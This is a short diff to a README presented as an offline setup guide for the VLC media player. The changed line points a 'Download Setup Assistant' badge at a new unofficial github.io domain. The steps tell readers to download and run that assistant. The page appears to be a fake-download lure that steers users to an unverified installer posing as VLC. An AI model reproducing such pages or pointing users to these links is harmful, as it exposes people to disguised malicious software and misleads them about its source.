@@ -1,6 +1,6 @@
 # VLC — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://vlc-free-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://vlc-freedownload-tool.github.io/.github/)
 
 ⚙️ How to Use  
 1. Download the setup assistant using the button above  
@@ -9,6 +9,7 @@
 4. Follow the on-screen instructions to install and configure VLC offline  
 5. Launch VLC — enjoy versatile media playback without internet access
 
+---
 
 🎯 What You Unlock
 
